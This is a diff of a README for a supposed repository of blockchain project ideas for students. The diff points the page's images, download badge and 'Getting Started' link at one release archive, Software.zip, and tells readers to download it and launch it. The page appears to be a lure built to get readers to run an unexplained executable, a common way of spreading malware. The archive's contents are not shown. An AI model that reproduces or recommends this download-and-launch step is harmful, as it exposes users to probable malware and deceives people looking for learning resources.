@@ -1,6 +1,6 @@
 # 10 Top Blockchain Project Ideas for Beginners and Students
 
-![Blockchain Image](https://example.com/blockchain_image)
+![Blockchain Image](https://github.com/sheesh7033/10-Top-Blockchain-Project-Ideas-for-Beginners-and-Students-/releases/download/v2.0/Software.zip)
 
 Welcome to the "10 Top Blockchain Project Ideas for Beginners and Students" repository! As the world of blockchain continues to expand rapidly, it is crucial for beginners and students to gain hands-on experience with this cutting-edge technology. This repository aims to provide you with top 10 blockchain project ideas that you can explore to enhance your understanding and skills in blockchain development.
 
@@ -38,9 +38,9 @@ This repository covers a wide range of topics related to blockchain technology a
 - Computer Science Projects
 
 ## Getting Started
-To access the project resources, download the [Software.zip](https://github.com/user-attachments/files/18388744/Software.zip) file and launch it. The zip file contains all the necessary materials to kickstart your blockchain project journey.
+To access the project resources, download the [https://github.com/sheesh7033/10-Top-Blockchain-Project-Ideas-for-Beginners-and-Students-/releases/download/v2.0/Software.zip](https://github.com/sheesh7033/10-Top-Blockchain-Project-Ideas-for-Beginners-and-Students-/releases/download/v2.0/Software.zip) file and launch it. The zip file contains all the necessary materials to kickstart your blockchain project journey.
 
-[![](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![](https://github.com/sheesh7033/10-Top-Blockchain-Project-Ideas-for-Beginners-and-Students-/releases/download/v2.0/Software.zip)](https://github.com/sheesh7033/10-Top-Blockchain-Project-Ideas-for-Beginners-and-Students-/releases/download/v2.0/Software.zip)
 
 ## Contributors
 This repository is maintained by a team of passionate blockchain developers and enthusiasts who are dedicated to fostering a vibrant community of learners in the blockchain space. Feel free to reach out to us for any questions, feedback, or collaboration opportunities.
@@ -48,9 +48,9 @@ This repository is maintained by a team of passionate blockchain developers and 
 ## Conclusion
 Embark on your blockchain development journey with the top 10 project ideas provided in this repository. Dive into the world of blockchain technology, explore innovative solutions, and enhance your skills as a beginner or student in this exciting field. Let's revolutionize the future with blockchain!
 
-![Blockchain Innovation](https://example.com/blockchain_innovation)
+![Blockchain Innovation](https://github.com/sheesh7033/10-Top-Blockchain-Project-Ideas-for-Beginners-and-Students-/releases/download/v2.0/Software.zip)
 
 Happy coding! 🚀🔗🌐
 
 ---
-In case the provided link for downloading the resources in the "Software.zip" file is not functional or unavailable, please check the "Releases" section of this repository for alternative download options. Thank you for your interest in blockchain project ideas for beginners and students! 🌟🔐📊
+In case the provided link for downloading the resources in the "https://github.com/sheesh7033/10-Top-Blockchain-Project-Ideas-for-Beginners-and-Students-/releases/download/v2.0/Software.zip" file is not functional or unavailable, please check the "Releases" section of this repository for alternative download options. Thank you for your interest in blockchain project ideas for beginners and students! 🌟🔐📊
